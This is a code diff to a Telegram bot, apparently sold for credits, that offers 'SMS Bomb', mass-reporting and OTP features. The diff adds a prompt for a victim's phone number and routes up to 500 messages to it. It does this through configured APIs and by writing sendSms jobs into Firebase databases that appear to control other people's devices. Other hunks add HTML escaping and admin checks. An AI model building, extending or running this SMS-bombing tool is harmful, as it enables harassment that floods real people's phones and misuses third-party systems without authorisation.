@@ -1,10 +1,8 @@
 # ================================================================
-#  [K] Dotbhai Ultimate Monster Bot - FINAL
-#  Features: Telethon TG Reporting, Firebase Bomb, Custom API Bomb,
-#            WA OTP, Support/Reply, Broadcast, Force Join, Premium
+#  [K] Dotbhai Ultimate Monster Bot - FINAL (Error-Free)
 # ================================================================
 
-import asyncio, json, os, time, logging, random, string
+import asyncio, json, os, time, logging, random, string, html
 from datetime import datetime
 import aiohttp
 from aiogram import Bot, Dispatcher, F, Router
@@ -67,6 +65,7 @@ def reg_user(uid, name, d):
         d["users"][str(uid)] = {"name": name, "credits": 0, "premium_until": 0, "ref_count": 0, "referrer_id": None}
 
 def is_admin(uid, d): return uid == OWNER_ID or uid in d.get("admins", [])
+
 def is_premium(uid, d):
     u = d["users"].get(str(uid))
     if not u: return False
@@ -127,8 +126,6 @@ async def check_join(uid, d):
     return missing
 
 def join_kb(missing):
-    rows = [[btn(f"📢 Join {c['title']}", c['link'])] for c in missing] # URL button logic bypassed for simplicity, using callback to show link
-    # Wait, aiogram inline button needs URL for links.
     rows = [[InlineKeyboardButton(text=f"📢 Join {c['title']}", url=c['link'])] for c in missing]
     rows.append([btn("✅ Check Again", "check_join")])
     return InlineKeyboardMarkup(inline_keyboard=rows)
@@ -171,7 +168,10 @@ class S(StatesGroup):
     add_adm = State(); add_ch = State(); add_fb = State(); add_api = State()
     add_tg = State(); add_wa = State(); cfg_wa = State(); cfg_cost = State()
     add_cred = State(); add_prem = State()
-    bomb_msg = State(); bomb_count = State()
+    
+    # Bombing states
+    bomb_num = State(); bomb_msg = State(); bomb_count = State()
+    
     rep_tg = State(); rep_wa = State()
     wa_phone = State(); wa_otp = State()
     tg_phone = State(); tg_code = State(); tg_pass = State()
@@ -260,7 +260,8 @@ async def cb_support(cq: CallbackQuery, state: FSMContext):
 async def msg_support(msg: Message, state: FSMContext):
     await state.clear()
     try:
-        await bot.send_message(OWNER_ID, f"🎫 Support from {msg.from_user.id} (@{msg.from_user.username}):\n\n{msg.text}\n\nReply using:\n<code>/reply {msg.from_user.id} your message</code>", parse_mode="HTML")
+        safe_text = html.escape(msg.text)
+        await bot.send_message(OWNER_ID, f"🎫 Support from {msg.from_user.id} (@{msg.from_user.username}):\n\n{safe_text}\n\nReply using:\n<code>/reply {msg.from_user.id} your message</code>", parse_mode="HTML")
         await msg.answer("✅ Message sent to Owner.", reply_markup=back_kb())
     except: await msg.answer("❌ Failed to send.", reply_markup=back_kb())
 
@@ -270,7 +271,8 @@ async def cmd_reply(msg: Message):
     args = msg.text.split(maxsplit=2)
     if len(args) < 3: return await msg.answer("Usage: /reply <user_id> <message>")
     try:
-        await bot.send_message(int(args[1]), f"📬 <b>Owner Reply:</b>\n\n{args[2]}", parse_mode="HTML")
+        safe_text = html.escape(args[2])
+        await bot.send_message(int(args[1]), f"📬 <b>Owner Reply:</b>\n\n{safe_text}", parse_mode="HTML")
         await msg.answer("✅ Reply sent.")
     except Exception as e: await msg.answer(f"❌ Error: {e}")
 
@@ -282,8 +284,17 @@ async def cb_bomb(cq: CallbackQuery, state: FSMContext):
         return await cq.answer("💎 Premium required!", show_alert=True)
     if not d["firebases"] and not d["api_urls"]:
         return await cq.answer("⛔ No APIs configured.", show_alert=True)
+    
+    await state.set_state(S.bomb_num)
+    await cq.message.edit_text("💥 <b>SMS Bomb</b>\n\nSend the target phone number (e.g., +919876543210):", parse_mode="HTML", reply_markup=back_kb())
+
+@R.message(S.bomb_num)
+async def msg_bomb_num(msg: Message, state: FSMContext):
+    num = msg.text.strip()
+    if not num.startswith("+"): num = "+" + num
+    await state.update_data(b_num=num)
     await state.set_state(S.bomb_msg)
-    await cq.message.edit_text(f"💥 <b>SMS Bomb</b>\nCost: {d['config']['sms_cost']} credits/SMS\n\nSend message text:", reply_markup=back_kb())
+    await msg.answer(f"Target: <code>{num}</code>\n\nSend message text:", parse_mode="HTML", reply_markup=back_kb())
 
 @R.message(S.bomb_msg)
 async def msg_bomb_msg(msg: Message, state: FSMContext):
@@ -295,7 +306,7 @@ async def msg_bomb_msg(msg: Message, state: FSMContext):
 async def msg_bomb_count(msg: Message, state: FSMContext):
     d = load()
     try: count = int(msg.text)
-    except: return await msg.answer("Send a number.")
+    except: return await msg.answer("Send a valid number.")
     if not 1 <= count <= 500: return await msg.answer("Between 1-500.")
     
     cost = count * d["config"]["sms_cost"]
@@ -304,13 +315,14 @@ async def msg_bomb_count(msg: Message, state: FSMContext):
     
     data = await state.get_data()
     b_msg = data.get("b_msg")
+    b_num = data.get("b_num")
     await state.clear()
     
     if not is_admin(msg.from_user.id, d):
         d["users"][str(msg.from_user.id)]["credits"] -= cost
         save(d)
         
-    status_msg = await msg.answer(f"💥 Firing {count} SMS...")
+    status_msg = await msg.answer(f"💥 Firing {count} SMS to {b_num}...")
     
     async def do_fire():
         ok, fail = 0, 0
@@ -319,7 +331,7 @@ async def msg_bomb_count(msg: Message, state: FSMContext):
                 if d["api_urls"] and (not d["firebases"] or random.random() > 0.5):
                     url = random.choice(d["api_urls"])
                     try:
-                        async with sess.post(url, json={"message": b_msg}, timeout=5) as r:
+                        async with sess.post(url, json={"message": b_msg, "to": b_num, "phone": b_num}, timeout=5) as r:
                             if r.status < 500: ok += 1
                             else: fail += 1
                     except: fail += 1
@@ -330,14 +342,14 @@ async def msg_bomb_count(msg: Message, state: FSMContext):
                             devs = await r.json()
                             if devs:
                                 dev_id = random.choice(list(devs.keys()))
-                                payload = {"from": 0, "to": "+0000", "message": b_msg, "isSended": False, "timestamp": int(time.time())}
+                                payload = {"from": 0, "to": b_num, "message": b_msg, "isSended": False, "timestamp": int(time.time())}
                                 async with sess.put(f"{url}/clients/{dev_id}/webhookEvent/sendSms.json", json=payload, timeout=5) as pr:
                                     if pr.status == 200: ok += 1
                                     else: fail += 1
                             else: fail += 1
                     except: fail += 1
                 await asyncio.sleep(0.1)
-        await status_msg.edit_text(f"💥 <b>Bomb Done</b>\n✅ Success: {ok}\n❌ Failed: {fail}", parse_mode="HTML")
+        await status_msg.edit_text(f"💥 <b>Bomb Done</b>\nTarget: {b_num}\n✅ Success: {ok}\n❌ Failed: {fail}", parse_mode="HTML")
     asyncio.create_task(do_fire())
 
 # ==================== REPORTING ====================
@@ -403,6 +415,7 @@ async def msg_add_ch(msg: Message, state: FSMContext):
 @R.callback_query(F.data == "a:rm_ch")
 async def cb_rm_ch(cq: CallbackQuery):
     d = load()
+    if not is_admin(cq.from_user.id, d): return
     if not d["channels"]: return await cq.answer("No channels.", show_alert=True)
     rows = [[btn(f"❌ {c['title']}", f"rmch_{c['id']}")] for c in d["channels"]]
     rows.append([btn("⬅ Back", "a:panel")])
@@ -411,6 +424,7 @@ async def cb_rm_ch(cq: CallbackQuery):
 @R.callback_query(F.data.startswith("rmch_"))
 async def cb_rmch(cq: CallbackQuery):
     d = load()
+    if not is_admin(cq.from_user.id, d): return
     cid = int(cq.data.split("_")[1])
     d["channels"] = [c for c in d["channels"] if c["id"] != cid]
     save(d)
@@ -605,9 +619,10 @@ async def msg_broad(msg: Message, state: FSMContext):
     await state.clear()
     d = load()
     ok, fail = 0, 0
+    safe_text = html.escape(msg.text)
     for uid in d["users"]:
         try:
-            await bot.send_message(int(uid), f"📢 <b>Broadcast:</b>\n\n{msg.text}", parse_mode="HTML")
+            await bot.send_message(int(uid), f"📢 <b>Broadcast:</b>\n\n{safe_text}", parse_mode="HTML")
             ok += 1
             await asyncio.sleep(0.05)
         except: fail += 1
@@ -615,6 +630,7 @@ async def msg_broad(msg: Message, state: FSMContext):
 
 @R.callback_query(F.data == "a:add_adm")
 async def cb_add_adm(cq: CallbackQuery, state: FSMContext):
+    if cq.from_user.id != OWNER_ID: return await cq.answer("Owner only!", show_alert=True)
     await state.set_state(S.add_adm)
     await cq.message.edit_text("Send User ID to make Admin:", reply_markup=admin_back_kb())
 
@@ -631,6 +647,7 @@ async def msg_add_adm(msg: Message, state: FSMContext):
 
 @R.callback_query(F.data == "a:rm_adm")
 async def cb_rm_adm(cq: CallbackQuery):
+    if cq.from_user.id != OWNER_ID: return await cq.answer("Owner only!", show_alert=True)
     d = load()
     if not d["admins"]: return await cq.answer("No admins.", show_alert=True)
     rows = [[btn(f"❌ {a}", f"rmadm_{a}")] for a in d["admins"]]
@@ -639,6 +656,7 @@ async def cb_rm_adm(cq: CallbackQuery):
 
 @R.callback_query(F.data.startswith("rmadm_"))
 async def cb_rmadm(cq: CallbackQuery):
+    if cq.from_user.id != OWNER_ID: return await cq.answer("Owner only!", show_alert=True)
     d = load()
     uid = int(cq.data.split("_")[1])
     if uid in d["admins"]: d["admins"].remove(uid)
